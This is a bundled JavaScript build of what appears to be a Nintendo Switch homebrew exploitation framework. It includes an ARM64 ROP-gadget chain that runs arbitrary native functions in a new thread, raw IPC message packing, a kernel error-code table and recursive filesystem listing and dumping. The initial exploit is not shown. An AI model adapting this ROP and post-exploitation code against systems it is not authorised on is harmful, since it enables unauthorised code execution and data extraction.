(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
module.exports={"sdbcore":true,"autorun":true}
},{}],2:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* global performance */
var utils = require('./utils');

class AsyncCaller {
	constructor (sc) {
		this.sc = sc;

		this.load_gadget = sc.gadget('020c41a9041442a9061c43a9082444a9');
		// this.ldr_x8 = sc.gadget('080540f900013fd6607e4092fd7b42a9f44f41a9')

		this.str_x0_x19 = sc.gadget('fd7b41a9600200f9f30742f8c0035fd6');
		this.ldr_x0 = sc.gadget('e00740f9fd7b41a9ff830091c0035fd6');
		this.br_x16 = sc.gadget('fd7bc1a800021fd6');
		this.ldr_x19 = sc.gadget('f31740f9fd7b43a9ff030191c0035fd6');
		this.exit_thread = sc.gadget('410100d4');
	}

	// timeout in milliseconds
	//  -1: no timeout
	call (func_ptr, args, timeout) {
		if (args.length >= 8) {
			throw new Error('too many arguments');
		}
		for (var i = 0; i < args.length; i++) {
			if (ArrayBuffer.isView(args[i])) {
				args[i] = args[i].buffer;
			}
			if (args[i] instanceof ArrayBuffer) {
				args[i] = this.sc.getArrayBufferAddr(args[i]);
			}
		}
		for (var i = args.length; i < 8; i++) {
			args[i] = [0, 0];
		}
		if (timeout === undefined) {
			timeout = 5000;
		}
		/*
      ldr_x0:
      0x7853e729a4      e00740f9       ldr x0, [sp, 8] ; x0 = &(&exitThread-0x30)
      0x7853e729a8      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7853e729ac      ff830091       add sp, sp, 0x20
      0x7853e729b0      c0035fd6       ret

      load_gadget:
      0x7853ed626c      020c41a9       ldp x2, x3, [x0, 0x10]
      0x7853ed6270      041442a9       ldp x4, x5, [x0, 0x20]
      0x7853ed6274      061c43a9       ldp x6, x7, [x0, 0x30]
      0x7853ed6278      082444a9       ldp x8, x9, [x0, 0x40]
      0x7853ed627c      0a2c45a9       ldp x10, x11, [x0, 0x50]
      -- snip --
      0x7a9c63963c      104448a9       ldp x16, x17, [x0, 0x80]
      -- snip --
      0x7853ed62a0      1c744ea9       ldp x28, x29, [x0, 0xe0]
      0x7853ed62a4      1e8040f9       ldr x30, [x0, 0x100]
      0x7853ed62a8      017c40f9       ldr x1, [x0, 0xf8]
      0x7853ed62ac      3f000091       mov sp, x1
      0x7853ed62b0      0004516d       ldp d0, d1, [x0, 0x110]
      -- snip --
      0x7853ed62f0      1f0441fd       ldr d31, [x0, 0x208]
      0x7853ed62f4      000440a9       ldp x0, x1, [x0]
      0x7853ed62f8      c0035fd6       ret

      br_x16:
      0x7a9c5ae6b0      fd7bc1a8       ldp x29, x30, [sp], 0x10
      0x7a9c5ae6b4      00021fd6       br x16

      FUNCTION EXECUTES HERE

      ldr_x19:
      0x7a9c22fea8      f31740f9       ldr x19, [sp, 0x28]       ; [0x28:4]=0x8e2e9c ; '('
      0x7a9c22feac      fd7b43a9       ldp x29, x30, [sp, 0x30]
      0x7a9c22feb0      ff030191       add sp, sp, 0x40
      0x7a9c22feb4      c0035fd6       ret

      str_x0_x19:
      0x7a9c303f4c      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7a9c303f50      600200f9       str x0, [x19]
      0x7a9c303f54      f30742f8       ldr x19, [sp], 0x20
      0x7a9c303f58      c0035fd6       ret

      ldr_x0:
      0x7853e729a4      e00740f9       ldr x0, [sp, 8] ; x0 = magic return flag
      0x7853e729a8      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7853e729ac      ff830091       add sp, sp, 0x20
      0x7853e729b0      c0035fd6       ret

      str_x0_x19
      0x7a9c303f4c      fd7b41a9       ldp x29, x30, [sp, 0x10]
      0x7a9c303f50      600200f9       str x0, [x19] ; magic return flag
      0x7a9c303f54      f30742f8       ldr x19, [sp], 0x20
      0x7a9c303f58      c0035fd6       ret

      exit_thread:
      0x7853e855b4      410100d4       svc 0xa      ; ExitThread
    */

		var load_gadget = this.load_gadget;
		// var ldr_x8 = this.ldr_x8
		var str_x0_x19 = this.str_x0_x19;
		var ldr_x0 = this.ldr_x0;
		var br_x16 = this.br_x16;
		var ldr_x19 = this.ldr_x19;
		var exit_thread = this.exit_thread;
		var sc = this.sc;

		return new Promise((resolve, reject) => {
			var magic_return_flag = [0, 0];
			while (magic_return_flag[0] === 0 && magic_return_flag[1] === 0) {
				magic_return_flag = [Math.floor(Math.random() * 0x1000), Math.floor(Math.random() * 0x1000)];
			}

			var load_area = sc.malloc(0x280);
			var sp = sc.malloc(0x300);
			var initial_sp = sp;
			var scratch = sc.malloc(0x20);
			sc.write8([0, 0], scratch, 0x00 >> 2); // return value
			sc.write8([0, 0], scratch, 0x10 >> 2); // magic return flag
			var return_value_addr = utils.add2(scratch, 0x00);
			var magic_return_flag_addr = utils.add2(scratch, 0x10);

			sc.write8(load_area, sp, 0x8 >> 2); // ldr x0, [sp, 8]
			sc.write8(load_gadget, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			sp = utils.add2(sp, 0x20); // add sp, sp, 0x20

			sc.write8(args[0], load_area, 0x000 >> 2);
			sc.write8(args[1], load_area, 0x008 >> 2);
			sc.write8(args[2], load_area, 0x010 >> 2);
			sc.write8(args[3], load_area, 0x018 >> 2);
			sc.write8(args[4], load_area, 0x020 >> 2);
			sc.write8(args[5], load_area, 0x028 >> 2);
			sc.write8(args[6], load_area, 0x030 >> 2);
			sc.write8(args[7], load_area, 0x038 >> 2);
			sc.write8(func_ptr, load_area, 0x080 >> 2); // x16
			sc.write8(sp, load_area, 0xf8 >> 2); // sp
			sc.write8(br_x16, load_area, 0x100 >> 2); // x30 (LR)

			sc.write8(ldr_x19, sp, 0x8 >> 2); // ldp x29, x30, [sp], 0x10
			sp = utils.add2(sp, 0x10);

			// br x16
			//  FUNCTION EXECUTES HERE

			// ldr_x19:
			sc.write8(return_value_addr, sp, 0x28 >> 2); // ldr x19, [sp, 0x28]
			sc.write8(str_x0_x19, sp, 0x38 >> 2); // ldp x29, x30, [sp, 0x30]
			sp = utils.add2(sp, 0x40); // add sp, sp, 0x40
			// ret

			// str_x0_19:
			sc.write8(ldr_x0, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			// str x0, [x19]
			sc.write8(magic_return_flag_addr, sp, 0x0 >> 2); // ldr x19, [sp], 0x20
			sp = utils.add2(sp, 0x20);
			// ret

			// ldr_x0:
			sc.write8(magic_return_flag, sp, 0x8 >> 2); // ldr x0, [sp, 8]
			sc.write8(str_x0_x19, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			sp = utils.add2(sp, 0x20); // add sp, sp, 0x20
			// ret

			// str_x0_19:
			sc.write8(exit_thread, sp, 0x18 >> 2); // ldp x29, x30, [sp, 0x10]
			// str x0, [x19]
			// ldr x19, [sp], 0x20
			sp = utils.add2(sp, 0x20);
			// ret

			// svcExitThread

			var prio = [58, 0];
			var handle = sc.svcCreateThread(ldr_x0, load_area, initial_sp, prio, 1).assertOk();
			sc.svcStartThread(handle).assertOk();

			var begin = performance.now();
			var wait = function () {
				var field = sc.read8(scratch, 0x10 >> 2);
				if (field[0] !== magic_return_flag[0] || field[1] !== magic_return_flag[1]) {
					if (timeout >= 0 && (performance.now() - begin) > timeout) {
						sc.svcCloseHandle(handle).assertOk();
						sc.free(load_area);
						sc.free(initial_sp);
						sc.free(scratch);
						reject(new Error('timed out'));
					} else {
						window.requestAnimationFrame(wait);
					}
				} else {
					sc.svcCloseHandle(handle).assertOk();
					sc.free(load_area);
					sc.free(initial_sp);
					sc.free(scratch);
					resolve(sc.read8(scratch, 0x00));
				}
			};
			window.requestAnimationFrame(wait);
		});
	}
}

module.exports = AsyncCaller;

},{"./utils":15}],3:[function(require,module,exports){
var utils = require('./utils');

var emptyOk;

class Result {
	constructor(isOk, value) {
		this.isOk = isOk;
		this.value = value;
	}

	/*
    If this result is not Ok, throw the error. If it is, return the value.
    Example:
      sc.svcCloseHandle(handle).assertOk();
      var thread = sc.svcCreateThread(...).assertOk();
    Throws:
      The error, if this is an Err result.
    Returns:
      The value, if this is an Ok result.
   */
	assertOk() {
		if(!this.isOk) {
			if(this.value) {
				throw new Error(this.value);
			} else {
				throw new Error("no error?");
			}
		}
		return this.value;
	}

	/*
    If this result is not Err, throw an error. If it is, return the error.
    Example:
      var err = sc.svcConnectToPort("bad port").assertError();
    Throws:
      new Error("expected error but was successful") if this is an Ok result.
    Returns:
      The error, if this is an Err result.
   */
	assertError() {
		if(this.isOk) {
			throw new Error("expected error but was successful");
		}
		return this.value;
	}

	/*
    Convenience function for working with ResultCodes. Expects a certain error code.
    Example:
      sc.svcCloseHandle(0).assertErrorCode(0xe401);
    Throws:
      new Error("expected error but was successful") if this is an Ok result.
      new Error("expected error code"...) if the error code does not match.
    Returns:
      The numeric error code.
   */
	assertErrorCode(expected) {
		expected = utils.trunc32(expected);
		var code = utils.trunc32(this.assertError().resultCode);
		if(code === expected) {
			return this.value;
		} else {
			throw new Error("expected error code 0x" + expected.toString(16) + ", got " + code.toString(16));
		}
	}

	/*
    map(f):
      Transform an Ok value, but pass through an Err value.
      Returns:
        A new Ok result with the return value of the mapping function if the
        original Result was Ok. Otherwise, the same Err result.
    map(f, e):
      Transform both an Ok value and an Err value.
      Returns:
        If Ok, return new Ok with the return value of the Ok mapping function.
        If Err, return new Err with the return value of the Err mapping function.
   */
	map(f, e) {
		if(this.isOk) {
			return new Ok(f(this.value));
		} else {
			if(e !== undefined) {
				return new Err(e(this.value));
			} else {
				return this;
			}
		}
	}

	/*
    Transform an Err value, but pass through an Ok value.
   */
	mapErr(e) {
		if(this.isOk) {
			return this;
		} else {
			return new Err(e(this.value));
		}
	}

	/*
		If Ok, return new Err with the value.
		If Err, return new Ok with the error.
		Useful for if you expect an error and to not get one is a real error.
	*/
	invert() {
		if(this.isOk) {
			return new Err(this.value);
		} else {
			return new Ok(this.value);
		}
	}

	/*
		If Ok and f(this.value) is also Ok, return Ok(f(this.value)).
		Otherwise, return Err(this.value)
	 */
	andThen(f) {
		if(this.isOk) {
			return f(this.value);
		} else {
			return this;
		}
	}
  
	/*
    Shorthand for .map(() => nv). Discards the original Ok value, useful for if it was
    going to be `undefined` anyway.
   */
	replaceValue(nv) {
		if(this.isOk) {
			return new Ok(nv);
		} else {
			return this;
		}
	}

	/*
    Get the value if this is an Ok result, otherwise null.
   */
	getValue() {
		return this.isOk ? this.value : null;
	}

	/*
    Get the error if this is an Err result, otherwise null.
   */
	getError() {
		return !this.isOk ? this.value : null;
	}

	/*
    If this is Ok, return the value. Otherwise, return v.
   */
	unwrapOrElse(v) {
		if(this.isOk) {
			return this.value;
		} else {
			return v;
		}
	}

	toString() {
		return "Result<" + (this.isOk ? "Ok" : "Err") + ">(" + this.value + ")";
	}
}

class Ok extends Result {
	constructor(value) {
		super(true, value);
	}
}

class Err extends Result {
	constructor(value) {
		super(false, value);
	}
}

module.exports = {Result, Ok, NullOk: new Ok(), Err};

},{"./utils":15}],4:[function(require,module,exports){
var modules = {};
var codes = {};

class ResultCode extends Error {
	constructor (code) {
		if (Array.isArray(code)) {
			code = code[0];
		}

		var moduleNumber = code & 0xFF;
		var descriptionNumber = code >> 8;
		var moduleName = modules[moduleNumber] || 'unknown';
		var descriptionString = codes[code] || 'unknown';

		super('0x' + code.toString(16) + ' (' + descriptionString + ' in module ' + moduleName + ')');

		this.code = code;
		this.resultCode = code;
		this.moduleNumber = moduleNumber;
		this.descriptionNumber = descriptionNumber;
		this.moduleName = moduleName;
		this.descriptionString = descriptionString;
	}

	toString() {
		return this.message;
	}
}

module.exports = ResultCode;

// last updated: http://switchbrew.org/index.php?title=Error_codes&oldid=2536
modules = {
	1: 'Kernel',
	2: 'FS',
	3: 'NVIDIA',
	5: 'NCM',
	6: 'DD',
	8: 'LR',
	9: 'Loader',
	10: 'CMIF (IPC command interface)',
	11: 'HIPC (IPC)',
	15: 'PM',
	16: 'NS',
	18: 'HTC',
	21: 'SM',
	22: 'RO userland',
	24: 'SDMMC',
	26: 'SPL',
	100: 'ETHC',
	101: 'I2C',
	105: 'Settings',
	110: 'NIFM',
	114: 'Display',
	116: 'NTC',
	117: 'FGM',
	120: 'PCIE',
	121: 'Friends',
	123: 'SSL',
	124: 'Account',
	128: 'AM',
	126: 'Mii',
	129: 'Play Report',
	133: 'PCV',
	134: 'OMM',
	137: 'NIM',
	138: 'PSC',
	140: 'USB',
	143: 'BTM',
	147: 'ERPT',
	148: 'APM',
	154: 'NPNS',
	157: 'ARP',
	158: 'BOOT',
	161: 'NFC',
	162: 'Userland assert',
	168: 'Userland crash',
	203: 'HID',
	206: 'Capture',
	345: 'libnx',
	651: 'TC',
	800: 'General web-applet',
	809: 'WifiWebAuthApplet',
	810: 'Whitelisted-applet',
	811: 'ShopN'
};

var codestrs = [
	'0x1C01  14  Invalid kernel capability descriptor',
	'0x4201  33  IsDebugMode isn\'t set.',
	'0xCA01  101  Invalid size',
	'0xCC01  102  Invalid address',
	'0xCE01  103  Address is NULL / buffer size is too small.',
	'0xD001  104  Memory full',
	'0xD201  105  Handle-table full.',
	'0xD401  106  Invalid memory state / invalid memory permissions.',
	'0xD801  108  When trying to set executable permission on memory.',
	'0xDC01  110  Stack address outside allowed range',
	'0xE001  112  Invalid thread priority.',
	'0xE201  113  Invalid processor id.',
	'0xE401  114  Invalid handle.',
	'0xE601  115  Syscall copy from user failed.',
	'0xE801  116  Invalid combination',
	'0xEA01  117  Time out? When you give 0 handles to svcWaitSynchronizationN.',
	'0xEC01  118  Canceled/interrupted [?]',
	'0xEE01  119  Exceeding maximum',
	'0xF001  120  Invalid enum',
	'0xF201  121  No such entry',
	'0xF401  122  Irq/DeviceAddressSpace/{...} already registered',
	'0xF601  123  Port remote dead',
	'0xF801  124  [Usermode] Unhandled interrupt',
	'0xFA01  125  Wrong memory permission?',
	'0xFC01  126  Reserved value',
	'0xFE01  127  Invalid hardware breakpoint',
	'0x10001  128  [Usermode] Fatal exception',
	'0x10601  131  Port max sessions exceeded',
	'0x10801  132  Resource limit exceeded',
	'0x41001  520  Process not being debugged',
	'0xE02  7  High byte in input u64 is zero.',
	"0x7802  60  The specified NCA-type doesn't exist for this title.",
	'0x7D202  1001  Process does not have RomFs',
	'0x7D402  1002  Title-id not found / savedata not found.',
	'0x13B002  2520  Gamecard not inserted',
	'0x13DA02  2541  Version check failed when mounting gamecard sysupdate partition?',
	'0x171402  2954  Invalid gamecard handle.',
	'0x196002  3248  Out of memory',
	'0x196202  3249  Out of memory',
	'0x1A4A02  3365  Out of memory',
	'0x235E02  4527  NCA-path used with the wrong titleID.',
	'0x250E02  4743  Corrupted NAX0 header.',
	'0x251002  4744  Invalid NAX0 magicnum.',
	'0x2EE202  6001  Invalid input',
	'0x2EE602  6003  Path too long',
	'0x2F5A02  6061  Offset outside storage',
	'0x313802  6300  Operation not supported',
	'0x320002  6400  Permission denied',
	'0x326602  6451  Missing titlekey(?) required to mount content',
	'0x3EA03  501  Invalid handle',
	'0x3EE03  503  Invalid memory mirror',
	"0xA05  5  NcaID not found. Returned when attempting to mount titles which exist that aren't *8XX titles, the same way *8XX titles are mounted.",
	'0xE05  7  TitleId not found',
	'0x1805  12  Invalid StorageId',
	'0xDC05  110  Gamecard not inserted',
	'0x17C05  190  Gamecard not initialized',
	'0x1F405  250  Sdcard not inserted',
	'0x20805  260  Storage not mounted',
	'0x408  2  Not initialized.',
	'0x608  3  Invalid control StorageID.',
	'0x808  4  Storage not found.',
	'0xA08  5  Access denied',
	'0xE08  7  Title is not registered.',
	'0x409  2  Maximum processes loaded.',
	'0x6609  51  Invalid memory state/permission',
	'0x6A09  53  Invalid NRR',
	'0xA209  81  Unaligned NRR address',
	'0xA409  82  Bad NRR size',
	'0xAA09  85  Bad NRR address',
	"0x1A80A  212  Bad magic (expected 'SFCO')",
	'0x20B  1  Size too big to fit to marshal.',
	'0x11A0B  141  Went past maximum during marshalling.',
	"0x1900B  200  Session doesn't support domains.",
	'0x25A0B  301  Remote process is dead.',
	'0x3D60B  491  IPC Query 1 failed.',
	'0x20F  1  Pid not found',
	'0x60F  3  Process has no pending events',
	'0x410  2  Title-id not found',
	'0xF010  120  Gamecard sysupdate not required',
	'0x1F610  251  Unexpected StorageId',
	'0x415  2  Not initialized.',
	'0x615  3  Max sessions',
	'0xC15  6  Invalid name (all zeroes)',
	'0x1015  8  Permission denied',
	'0x416  2  Address space is full',
	'0x616  3  NRO already loaded',
	'0x816  4  Invalid NRO header values',
	'0xC16  6  Bad NRR magic',
	'0x1016  8  Reached max NRR count',
	'0x1216  9  Unable to verify NRO hash or NRR signature',
	'0x80216  1025  Address not page-aligned',
	'0x80416  1026  Incorrect NRO size',
	'0x80816  1028  NRO not loaded',
	'0x80A16  1029  NRR not loaded',
	'0x80C16  1030  Already initialized',
	'0x80E16  1031  Not initialized',
	'0x41A  2  Argument is invalid',
	'0xD01A  104  All AES engines busy',
	'0xD21A  105  Invalid AES engine-id',
	'0x272  1  Invalid AppletResourceUserId',
	'0xCC74  102  Time not set',
	'0x287C  20  Argument is NULL',
	'0x2C7C  22  Argument is invalid',
	'0x3C7C  30  Bad input buffer size',
	'0x407C  32  Invalid input buffer',
	'0x3C9D  30  Address is NULL',
	'0x3E9D  31  PID is NULL',
	'0x549D  42  Already bound',
	'0xCC9D  102  Invalid PID',
	'0x3CF089  7800  Unknown/invalid libcurl error.'];

codestrs.forEach((codestr) => {
	var match;
	if ((match = /^(0x[A-Fa-f0-9]+)\s+[0-9]+\s+(.+)$/gm.exec(codestr)) !== null) {
		var code = parseInt(match[1], 16);
		var descStr = match[2];
		codes[code] = descStr;
	}
});

},{}],5:[function(require,module,exports){
/* eslint no-redeclare: "off" */

var utils = require('../utils');

function IDirectory (sc, path, handle, fs) {
	this.sc = sc;
	this.fs = fs;
	this.handle = handle;
	this.path = path;
}

IDirectory.prototype.GetEntryCount = function () {
	return this.sc.ipcMsg(1).sendTo(this.handle).asResult().map((r) => [r.dataBuffer[0], r.dataBuffer[1]]);
};

IDirectory.prototype.GetEntries = function (buf, numEntries) {
	if(buf.byteLength < 0x310 * numEntries) {
		throw new Error("buffer too small");
	}
	return this.sc.ipcMsg(0).data(0).bDescriptor(buf, 0x310 * numEntries, 0).sendTo(this.handle).asResult();
};

IDirectory.prototype.DirList = function (indentation) {
	var s = '';

	if (indentation !== undefined) {
		for (var i = 0; i < indentation; i++) {
			s += '   ';
		}
	}

	var entryCount = utils.trunc32(this.GetEntryCount().assertOk());

	if (entryCount > 0) {
		var entryBuf = new Uint32Array(0x310 * entryCount);
		this.GetEntries(entryBuf, entryCount).assertOk();
		for (i = 0; i < entryCount; i++) {
			var fn = this.path + utils.u8a2str(new Uint8Array(entryBuf.buffer, 0x310 * i, 0x300));
			var eType = entryBuf[(0x310 * i + 0x304) >> 2];
			if (eType === 1) {
				utils.log(s + '<FILE> ' + fn);
			} else {
				utils.log(s + '<FOLDER> ' + fn + '/');
				var f = this.fs.OpenDir(fn + '/').assertOk();
				try {
					f.DirList(indentation + 1);
				} finally {
					f.Close();
				}
			}
		}
	}
};

IDirectory.prototype.DirDump = function (dumpPath) {
	var entryCount = utils.trunc32(this.GetEntryCount().assertOk());
	if (entryCount > 0) {
		var entryBuf = new Uint32Array(0x310 * entryCount);
		this.GetEntries(entryBuf, entryCount).assertOk();
		for (var i = 0; i < entryCount; i++) {
			var fn = this.path + utils.u8a2nullstr(new Uint8Array(entryBuf.buffer, 0x310 * i, 0x300));
			var eType = entryBuf[(0x310 * i + 0x304) >> 2];
			if (eType === 1) {
				utils.log('<FILE> ' + fn);
				var fp = this.fs.OpenFile(fn).assertOk();
				try {
					var buf = fp.ReadAll().assertOk();
					this.sc.memdump(buf, fp.GetSize().assertOk(), dumpPath + fn);
				} finally {
					fp.Close();
				}
			} else {
				utils.log('<FOLDER> ' + fn + '/');
				var f = this.fs.OpenDir(fn + '/').assertOk();
				try {
					f.DirDump(dumpPath);
				} finally {
					f.Close();
				}
			}
		}
	}
};

IDirectory.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

module.exports = IDirectory;

},{"../utils":15}],6:[function(require,module,exports){
var utils = require('../utils');

function IFile (sc, handle) {
	this.sc = sc;
	this.handle = handle;
}

IFile.prototype.Write = function (offset, buf, size) {
	return this.sc.ipcMsg(1).aDescriptor(buf, size, 1).datau64(0, offset, size).sendTo(this.handle).asResult();
};

IFile.prototype.GetSize = function () {
	return this.sc.ipcMsg(4).sendTo(this.handle).asResult()
		.map((r) => [r.data[0], r.data[1]]);
};

IFile.prototype.Read = function (size) {
	if(size instanceof ArrayBuffer || ArrayBuffer.isView(size)) {
		var m = size;
		size = m.byteLength;
	} else {
		var m = new ArrayBuffer(utils.trunc32(size));
	}
	return this.sc.ipcMsg(0).datau64(0, 0, size).bDescriptor(m, size, 1).sendTo(this.handle).asResult().replaceValue(m);
};

IFile.prototype.ReadAll = function () {
	var self = this;
	return this.GetSize().andThen((size) => {
		var fSize = utils.trunc32(size);
		var m = new ArrayBuffer(fSize);
		return self.sc.ipcMsg(0).datau64(0, 0, fSize).bDescriptor(m, fSize, 1).sendTo(self.handle).asResult().replaceValue(m);
	});
};

IFile.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

module.exports = IFile;

},{"../utils":15}],7:[function(require,module,exports){
var utils = require('../utils');
var Result = require('../Result');

function IFileSystem (sc, handle) {
	this.sc = sc;
	this.handle = handle;
}

IFileSystem.prototype.OpenDir = function (dir) {
	var path = utils.str2ab(dir);
	var self = this;
	return this.sc.ipcMsg(9).datau64(3).xDescriptor(path, path.byteLength, 0).sendTo(this.handle).asResult()
		.map((r) => new self.sc.IDirectory(self.sc, dir, r.movedHandles[0], self));
};

IFileSystem.prototype.CreateFile = function (path, size) {
	if (size === undefined) {
		size = 0x100;
	}
	var pbuf = utils.str2ab(path);
	var res = this.sc.ipcMsg(0).datau64(0, size).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle);
	return res.asResult();
};

IFileSystem.prototype.OpenFile = function (path) {
	var pbuf = utils.str2ab(path);
	var self = this;
	return this.sc.ipcMsg(8).datau32(3).xDescriptor(pbuf, pbuf.byteLength, 0).sendTo(this.handle)
		.asResult()
		.map((r) => new self.sc.IFile(self.sc, r.movedHandles[0]));
};

IFileSystem.prototype.WriteBufferToFile = function (offset, buffer, size) {
	return this.sc.ipcMsg(1).aDescriptor(buffer, size, 1).data(0, offset, size).sendTo(this.handle).asResult();
};

IFileSystem.prototype.Close = function () {
	return this.sc.svcCloseHandle(this.handle);
};

module.exports = IFileSystem;

},{"../Result":3,"../utils":15}],8:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
var sploitcore = require('./sploitcore');
var sploitMixin = require('./sploitMixin');
var svcMixin = require('./svc');
var utils = require('./utils');
var ResultCode = require('./ResultCode');
var Result = require('./Result');

function IPCMessage (sc, sender, cmdId) {
	this.sc = sc;
	this.sender = sender;
	this.pid = null;
	this.type = 4;
	this.cmdId = cmdId;
	this.resultCode = cmdId;
	this.success = this.resultCode === 0 || this.resultCode === undefined;
	this.dataBuffer = [];
	this.aDescriptors = [];
	this.bDescriptors = [];
	this.cDescriptors = [];
	this.xDescriptors = [];
	this.copiedHandles = [];
	this.movedHandles = [];
	this.objectDomainCommand = undefined;
	this.objectId = 0;
	this.copyBuffers = [];
}

IPCMessage.prototype.setType = function (t) {
	this.type = t;
	return this;
};

IPCMessage.prototype.sendPid = function () {
	this.pid = true;
	return this;
};

IPCMessage.prototype.setCmd = function (cmdId) {
	this.cmdId = cmdId;
	this.resultCode = cmdId;
	return this;
};

IPCMessage.prototype.setResult = function (rescode) {
	this.setCmd(rescode);
	this.success = this.resultCode === 0;
};

IPCMessage.prototype.data = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		var v = arguments[i];
		if (v instanceof Array) {
			this.dataBuffer.push(v[0]);
			this.dataBuffer.push(v[1]);
		} else if(typeof(v) === "number") {
			this.dataBuffer.push(v);
			this.dataBuffer.push(0);
		} else {
			throw new Error("can't put in an IPC request: " + v);
		}
	}

	return this;
};

IPCMessage.prototype.datau32 = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		this.dataBuffer.push(utils.trunc32(arguments[i]));
	}
	return this;
};

IPCMessage.prototype.datau64 = function () {
	this.dataBuffer = [];
	for (var i = 0; i < arguments.length; i++) {
		var v = utils.pad64(arguments[i]);
		this.dataBuffer.push(v[0]);
		this.dataBuffer.push(v[1]);
	}

	return this;
};

IPCMessage.prototype.dataArrayBuffer = function(ab) {
	this.dataBuffer = [];
	var u32 = new Uint32Array(ab);
	for(var i = 0; i < u32.length; i++) {
		this.dataBuffer[i] = u32[i];
	}

	return this;
};

IPCMessage.prototype.addDescriptor = function (da, addr, size, third) {
	if (addr instanceof ArrayBuffer || ArrayBuffer.isView(addr)) {
		var buf = addr;
		if (size === undefined) {
			size = buf.byteLength;
		}
		if (this.sender.isBrowser) {
			if (buf.addr === undefined) {
				buf.addr = this.sc.getArrayBufferAddr(buf);
			}
			addr = buf.addr;
		} else {
			addr = this.sender.malloc(size);
			this.copyBuffers.push({
				addr, buf, size
			});
		}
	}
	addr = utils.pad64(addr);
	size = utils.pad64(size);
	if (third !== undefined) { da.push([addr, size, third]); } else { da.push([addr, size]); }
	return this;
};

IPCMessage.prototype.aDescriptor = function (addr, size, perm) {
	return this.addDescriptor(this.aDescriptors, addr, size, perm);
};

IPCMessage.prototype.bDescriptor = function (addr, size, perm) {
	return this.addDescriptor(this.bDescriptors, addr, size, perm);
};

/*
	type 0xA buffers have u16 length shenanigans
 */
IPCMessage.prototype.cDescriptor = function (addr, size, hasU16Length) {
	return this.addDescriptor(this.cDescriptors, addr, size, hasU16Length);
};

IPCMessage.prototype.xDescriptor = function (addr, size, counter) {
	return this.addDescriptor(this.xDescriptors, addr, size, counter);
};

IPCMessage.prototype.copyHandle = function (handle) {
	this.copiedHandles.push(utils.trunc32(handle));
	return this;
};

IPCMessage.prototype.moveHandle = function (handle) {
	this.movedHandles.push(utils.trunc32(handle));
	return this;
};

IPCMessage.prototype.toObject = function (object) {
	this.objectDomainCommand = 1;
	this.objectId = object;
	return this;
};

IPCMessage.prototype.closeObject = function (object) {
	this.objectDomainCommand = 2;
	this.objectId = object;
	return this;
};

IPCMessage.prototype.pack = function () {
	/*
    Structure of an IPC packet:
    2*u32 header
      type
      number of descriptors
      length of raw data section / 4
      "flags for buf c descriptors"
      enable handle descriptor
    x descriptors
    a descriptors
    b descriptors
    w descriptors
    raw data section
      padding
      aligned data section
      padding
      c descriptor lengths
    c descriptors
   */
	var alignedDataSection = [];
  
	var dataPayload = [];
	dataPayload.push(0x49434653);
	dataPayload.push(0);
	dataPayload.push(this.cmdId);
	dataPayload.push(0);
	for (var i = 0; i < this.dataBuffer.length; ++i) {
		dataPayload.push(this.dataBuffer[i]);
	}
  
	if (this.objectDomainCommand !== undefined) {
		alignedDataSection.push(this.objectDomainCommand | ((dataPayload.length * 4) << 16));
		alignedDataSection.push(this.objectId);
		alignedDataSection.push(0);
		alignedDataSection.push(0);
	}

	alignedDataSection = alignedDataSection.concat(dataPayload);

	var cDescriptorSection = [];
	for (var i = 0; i < this.cDescriptors.length; ++i) {
		var v = this.cDescriptors[i];
		var addr = utils.trunclt64(v[0], 48);
		var size = utils.trunclt32(v[1], 16);
		cDescriptorSection.push(addr[0]);
		cDescriptorSection.push((addr[1] & 0xFFFF) | (size << 16));
	}

	var cDescriptorsWithU16Length = this.cDescriptors.filter((c) => c[2]);
	var u16Lengths = cDescriptorsWithU16Length.map((c) => c[1][0]);
	if(u16Lengths.length % 2 > 0) {
		u16Lengths.push(0);
	}
	var cDescriptorLengthsSection = Array.from(new Uint32Array(new Uint16Array(u16Lengths).buffer));
  
	var descriptorSection = [];

	// handle descriptor
	if (this.pid || this.movedHandles.length > 0 || this.copiedHandles.length > 0) {
		descriptorSection.push((this.pid ? 1 : 0) | (this.copiedHandles.length << 1) | (this.movedHandles.length << 5)); // Handle descriptor
		if (this.pid) {
			descriptorSection.push(0);
			descriptorSection.push(0);
		}
		for (var i = 0; i < this.copiedHandles.length; ++i) { descriptorSection.push(this.copiedHandles[i]); }
		for (var i = 0; i < this.movedHandles.length; ++i) { descriptorSection.push(this.movedHandles[i]); }
	}

	// x descriptors
	for (var i = 0; i < this.xDescriptors.length; ++i) {
		var v = this.xDescriptors[i];
		var addr = v[0];
		var size = utils.trunc32(v[1]);
		var counter = v[2];
		descriptorSection.push(
			(counter & 0x3F) |
			(((addr[1] & 0x70) >>> 4) << 6) |
			(counter & 0xE00) |
			((addr[1] & 0xF) << 12) |
			size << 16
		);
		descriptorSection.push(addr[0]);
	}

	// a & b descriptors
	for (var i = 0; i < this.aDescriptors.length + this.bDescriptors.length; ++i) {
		var v = i < this.aDescriptors.length ? this.aDescriptors[i] : this.bDescriptors[i - this.aDescriptors.length];
		var addr = v[0];
		var size = utils.pad64(v[1]);
		var perm = v[2];
		descriptorSection.push(size[0]);
		descriptorSection.push(addr[0]);
		descriptorSection.push(
			perm |
			(((addr[1] & 0x70) >>> 4) << 2) |
			((size[1] & 0xF) << 24) |
			((addr[1] & 0xF) << 28)
		);
	}

	var rawDataSection = [];
